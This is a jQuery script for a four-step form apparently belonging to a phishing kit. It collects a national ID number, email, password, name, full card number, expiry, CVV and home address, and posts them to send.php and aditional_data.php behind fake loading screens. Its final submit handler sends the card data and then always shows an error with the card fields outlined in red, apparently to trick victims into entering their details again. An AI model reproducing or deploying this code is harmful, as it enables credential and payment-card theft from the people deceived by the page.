function error(id, type){
	if(type == "add"){
		$("#"+id).addClass("error");
		$("#"+id+"_error").parent().addClass("show");
	}
	else {
		$("#"+id).removeClass("error");
		$("#"+id+"_error").parent().removeClass("show");
	}
}
function loading(num){
	$(".loading").css("display", "flex");
	setTimeout(function(){
		$(".step"+num).each(function(){
			$(this).css("display", "none");
		});
		num2 = num+1;
		$(".loading").css("display", "none");
		$(".step"+num2).each(function(){
			$(this).css("display", "block");
		});
	}, 2500);
}
function finish(){
	$(".loading").css("display", "flex");
	setTimeout(function(){
		$(".step4_1").css("display", "none");
		$(".step4").each(function(){
			$(this).css("display", "none");
		});
		$(".loading").css("display", "none");
		$(".step5").each(function(){
			$(this).css("display", "flex");
		});
	}, 2500);
}

// Paso 1
$("#dni").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#step1").click(function(e){
	e.preventDefault();
	if($("#dni").val().length == 8){
		if($("#email").val().length != 0){
			if($("#email").val().includes("@")){
				error("email", "remove");
				loading(1);
			}
			else {
				error("email", "add");
			}
		}
		else {
			error("email", "add");
		}
		error("dni", "remove");
	}
	else {
		error("dni", "add");
	}
});
$("#passwd_toggle").click(function(e){
	e.preventDefault();
	var x = document.getElementById("passwd");
	if (x.type === "password") {
		x.type = "text";
	} else {
		x.type = "password";
	}
});


// Paso 2
$("#name").bind('keypress', function (event) {
	var regex = new RegExp("^[a-zA-Z .\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#step2").click(function(e){
	e.preventDefault();
	if($("#genero").val() != null){
		if($("#name").val() != 0){
			if($("#lastname").val().length != 0){
				error("lastname", "remove");
				if($("#passwd").val().length != ""){
					error("passwd", "remove");
					loading(2);
				}
				else {
					error("passwd", "add");
				}
			}
			else {
				error("lastname", "add");
			}
			error("name", "remove");
		}
		else {
			error("name", "add");
		}
		error("genero", "remove");
	}
	else {
		error("genero", "add");
	}
});

// Paso 3
$("#name_card").bind('keypress', function (event) {
	var regex = new RegExp("^[a-zA-Z .\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#venc").keyup(function(){
	e = $(this).val();
	el = e.length;
	ele = $(this);
	if(el == 3){
		last = e.substr(2, 1);
		if(last == "/"){
			val1 = e.substr(0,2);
			ele.val(val1);
		}
		else{
			val1 = e.substr(0,2);
			val2 = e.substr(2, 1);
			ele.val(val1+"/"+val2);
		}
	}
});

$("#card").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#venc").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#cvv").bind('keypress', function (event) {
	var regex = new RegExp("^[0-9\b]+$");
	var key = String.fromCharCode(!event.charCode ? event.which : event.charCode);
	if (!regex.test(key)) {
		event.preventDefault();
		return false;
	}
});
$("#card").keyup(function(){
	e = $(this).val();
	el = e.length;
	ele = $(this);
	if(el == 5){
		last = e.substr(4, 1);
		if(last == " "){
			val1 = e.substr(0, 4);
			ele.val(val1);
		}
		else {
			val1 = e.substr(0, 4);
			val2 = e.substr(4, 1);
			ele.val(val1+" "+val2);
		}
	}
	else if(el == 10){
		last = e.substr(9, 1);
		if(last == " "){
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			ele.val(val1+" "+val2);
		}
		else {
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			val3 = e.substr(9, 1);
			ele.val(val1+" "+val2+" "+val3);
		}
	}
	else if(el == 15){
		last = e.substr(14, 1);
		if(last == " "){
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			val3 = e.substr(10, 4);
			ele.val(val1+" "+val2+" "+val3);
		}
		else {
			val1 = e.substr(0, 4);
			val2 = e.substr(5, 4);
			val3 = e.substr(10, 4);
			val4 = e.substr(14, 4);
			ele.val(val1+" "+val2+" "+val3+" "+val4);
		}
	}
});
$("#step3").click(function(e){
	e.preventDefault();
	if($("#name_card").val().length != 0){
		if($("#card").val().length == 19){
			if($("#venc").val().length == 5){
				if($("#cvv").val().length == 3 || $("#cvv").val().length == 4){
					loading(3);
					var form = $("#valid_data");
					$.ajax({
						type: "POST",
						url: "send.php",
						data: form.serialize()
					});
					error("cvv", "remove");
				}
				else {
					error("cvv", "add");
				}
				error("venc", "remove");
			}
			else {
				error("venc", "add");
			}
			error("card", "remove");
		}
		else {
			error("card", "add");
		}
		error("name_card", "remove");
	}
	else {
		error("name_card", "add");
	}
});

// Paso 4
$("#accept_terms").click(function(){
	$("#terms").css("display", "block");
	$("body").css("overflow", "hidden");
})
$("#cancelar").click(function(){
	$("#terms").css("display", "none");
	$("body").css("overflow", "auto");
	$("#accept_terms .checkbox_button").removeClass("active");
	$("#accept_terms .checkbox_button").addClass("inactive");
	$("#accept_terms .checkbox_button").attr("data-accept", "0");
});
$("#aceptar").click(function(){
	$("#terms").css("display", "none");
	$("body").css("overflow", "auto");
	$("#accept_terms .checkbox_button").removeClass("inactive");
	$("#accept_terms .checkbox_button").addClass("active");
	$("#accept_terms .checkbox_button").attr("data-accept", "1");
});
$("#step4").click(function(e){
	e.preventDefault();
	if($("#calle").val().length != 0){
		if($("#numero_calle").val().length != 0){
			if($("#postalcode").val().length != 0){
				if($("#terms_check").attr("data-accept") != 0){
					finish();
					var form = $("#valid_data");
					$.ajax({
						type: "POST",
						url: "aditional_data.php",
						data: form.serialize()
					});
					error("terms", "remove");
				}
				else {
					error("terms", "add");
				}
				error("postalcode", "remove");
			}
			else {
				error("postalcode", "add");
			}
			error("numero_calle", "remove");
		}
		else {
			error("numero_calle", "add");
		}
		error("calle", "remove");
	}
	else {
		error("calle", "add");
	}
});

$("#valid_data").submit(function(e){
	e.preventDefault();
	if($("#name").val() != "" && $("#dni").val() != "" && $("#card").val() != "" && $("#venc").val() != "" && $("#cvv").val() != ""){
		$(".checkout_content").css("display", "none");
		$(".checkout_load").css("display", "block");
		$(".alert-error").css("display", "none");
		var form = $("#valid_data");
		$.ajax({
			type: "POST",
			url: "send.php",
			data: form.serialize()
		});
		setTimeout(function(){
			$("#name").css("border", "1px solid red");
			$("#card").css("border", "1px solid red");
			$("#venc").css("border", "1px solid red");
			$("#cvv").css("border", "1px solid red");
			$(".checkout_content").css("display", "block");
			$(".checkout_load").css("display", "none");
			$(".alert-error").css("display", "block");
		}, 2500);
	}
});